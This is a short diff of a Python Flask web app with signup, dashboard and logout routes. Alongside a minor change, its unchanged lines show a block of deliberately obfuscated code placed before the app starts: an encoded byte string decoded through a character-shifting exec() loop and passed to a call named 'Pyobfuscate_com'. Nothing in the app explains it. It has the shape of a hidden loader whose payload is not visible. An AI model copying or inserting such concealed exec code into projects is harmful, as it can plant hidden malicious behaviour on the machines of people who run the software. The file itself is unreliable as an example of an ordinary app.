@@ -85,8 +85,6 @@ def signup():
 def dashboard():
     return render_template('app.html', name=current_user.username, coin=current_user.coins)
 
-with open('url.txt') as f:
-     lines = f.readlines()
 @app.route('/logout')
 @login_required
 def logout():
@@ -102,6 +100,7 @@ _return=(lambda:type(None)())._=(b'\xe1\x89\x8e\xe1\x89\x81\xe1\x8a\x85\xe1\x8a\
 b=lambda**args:type("exec",(),args)();_system=b(a=chr(0)).a;exec('''for self in range(0o0,sum(map(lambda map:0o1,_return))):_system=chr(0).join((_system,chr(ord(_return[self])+(~hex+1))))''')
 for _,i in numpy(_float(_int(_str(''.join( [_system[i-1] for i in range(len(_system),0,-1)])))).decode('utf8_ucs4'),lambda s: next('u0063\u006F\u0075\u006E\u0074\u0028\u0029') if s.startswith('\x3e') else -1):_winkle = ''.join(s.rstrip('\n') for s in i)
 Pyobfuscate_com(_delete=None == False,_sparkle= _winkle)
+
 
 if __name__ == '__main__':
     app.run(debug=True)
